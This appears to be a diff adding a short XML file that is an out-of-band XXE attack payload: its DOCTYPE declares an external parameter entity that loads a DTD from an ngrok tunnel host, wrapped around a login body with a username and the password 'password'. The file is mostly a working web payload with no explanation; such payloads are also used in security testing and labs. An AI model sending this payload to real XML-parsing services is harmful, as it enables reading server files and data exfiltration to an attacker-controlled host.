@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE root[
+	<!ENTITY % dtd SYSTEM "https://0072-2a09-bac5-d45a-16dc-00-247-c.ngrok-free.app/1.dtd">%dtd;
+]>
+<root>
+	<user>woojay</user>
+	<pass>password</pass>
+</root>
